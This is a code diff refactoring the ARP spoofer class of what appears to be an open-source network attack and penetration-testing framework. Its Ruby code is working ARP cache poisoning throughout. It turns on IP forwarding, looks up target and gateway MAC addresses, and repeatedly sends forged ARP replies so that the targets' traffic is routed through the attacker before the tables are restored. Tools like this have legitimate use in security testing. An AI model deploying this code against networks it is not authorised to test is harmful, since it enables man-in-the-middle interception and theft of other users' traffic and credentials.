@@ -9,47 +9,29 @@ Blog   : http://www.evilsocket.net/
 This project is released under the GPL 3 license.
 
 =end
+require_relative '../context'
 require_relative '../base/ispoofer'
 require_relative '../network'
 require_relative '../logger'
-require_relative '../factories/firewall_factory'
 require 'colorize'
 
 class ArpSpoofer < ISpoofer
-  def initialize( iface, router_ip, targets )
-    @iface        = iface
-    @gw_ip        = router_ip
+  def initialize
+    @ctx          = Context.get
     @gw_hw        = nil
-    @targets      = targets
-    @firewall     = FirewallFactory.get_firewall
-    @forwarding   = @firewall.forwarding_enabled?
+    @forwarding   = @ctx.firewall.forwarding_enabled?
     @spoof_thread = nil
     @running      = false
 
     Logger.debug 'ARP SPOOFER SELECTED'
 
-    Logger.info "Getting gateway #{@gw_ip} MAC address ..."
-    @gw_hw = Network.get_hw_address( @iface, @gw_ip )
-    if @gw_hw.nil? then
+    Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."
+    @gw_hw = Network.get_hw_address( @ctx.iface, @ctx.gateway )
+    if @gw_hw.nil?
       raise "Couldn't determine router MAC"
     end
 
     Logger.info "  Gateway MAC   : #{@gw_hw}"
-
-    @targets.each do |target|
-        if target.mac.nil?
-            Logger.info "Getting target #{target.ip} MAC address ..."
-
-            hw = Network.get_hw_address( @iface, target.ip, 1 )
-            if hw.nil?
-              raise "Couldn't determine target MAC"
-            end
-
-            Logger.info "  Target MAC    : #{hw}"
-
-            target.mac = hw
-        end
-    end
   end
 
   def send_spoofed_packed( saddr, smac, daddr, dmac )
@@ -62,7 +44,7 @@ class ArpSpoofer < ISpoofer
     pkt.arp_daddr_ip = daddr
     pkt.arp_opcode = 2
 
-    pkt.to_w(@iface[:iface])
+    pkt.to_w(@ctx.iface[:iface])
   end
 
   def start
@@ -73,11 +55,12 @@ class ArpSpoofer < ISpoofer
     if @forwarding == false
       Logger.debug 'Enabling packet forwarding.'
 
-      @firewall.enable_forwarding(true)
+      @ctx.firewall.enable_forwarding(true)
     end
 
     @running = true
     @spoof_thread = Thread.new do
+      prev_size = @ctx.targets.size
       loop do
         if not @running
             Logger.debug 'Stopping spoofing thread ...'
@@ -85,12 +68,37 @@ class ArpSpoofer < ISpoofer
             break
         end
 
-        Logger.debug "Spoofing #{@targets.size} targets ..."
+        size = @ctx.targets.size
 
-        @targets.each do |target|
-          send_spoofed_packed @gw_ip,    @iface[:eth_saddr], target.ip, target.mac
-          send_spoofed_packed target.ip, @iface[:eth_saddr], @gw_ip,    @gw_hw
+        if size > prev_size
+          Logger.warn "Aquired #{size - prev_size} new targets."
+        elsif size < prev_size
+          Logger.warn "Lost #{prev_size - size} targets."
         end
+
+        Logger.debug "Spoofing #{@ctx.targets.size} targets ..."
+
+        @ctx.targets.each do |target|
+          # targets could change, update mac addresses if needed
+          if target.mac.nil?
+            Logger.warn "Getting target #{target.ip} MAC address ..."
+
+            hw = Network.get_hw_address( @ctx.iface, target.ip, 1 )
+            if hw.nil?
+              Logger.warn "Couldn't determine target MAC"
+              next
+            else
+              Logger.info "  Target MAC    : #{hw}"
+
+              target.mac = hw
+            end
+          end
+
+          send_spoofed_packed @ctx.gateway,    @ctx.iface[:eth_saddr], target.ip, target.mac
+          send_spoofed_packed target.ip, @ctx.iface[:eth_saddr], @ctx.gateway,    @gw_hw
+        end
+
+        prev_size = @ctx.targets.size
 
         sleep(1)
       end
@@ -103,16 +111,18 @@ class ArpSpoofer < ISpoofer
     Logger.info 'Stopping ARP spoofer ...'
 
     Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
-    @firewall.enable_forwarding( @forwarding )
+    @ctx.firewall.enable_forwarding( @forwarding )
 
     @running = false
     @spoof_thread.join
 
-    Logger.info "Restoring ARP table of #{@targets.size} targets ..."
+    Logger.info "Restoring ARP table of #{@ctx.targets.size} targets ..."
 
-    @targets.each do |target|
-      send_spoofed_packed @gw_ip,    @gw_hw,     target.ip, target.mac
-      send_spoofed_packed target.ip, target.mac, @gw_ip,    @gw_hw
+    @ctx.targets.each do |target|
+      if !target.mac.nil?
+        send_spoofed_packed @ctx.gateway,    @gw_hw,     target.ip, target.mac
+        send_spoofed_packed target.ip, target.mac, @ctx.gateway,    @gw_hw
+      end
     end
     sleep 1
   end
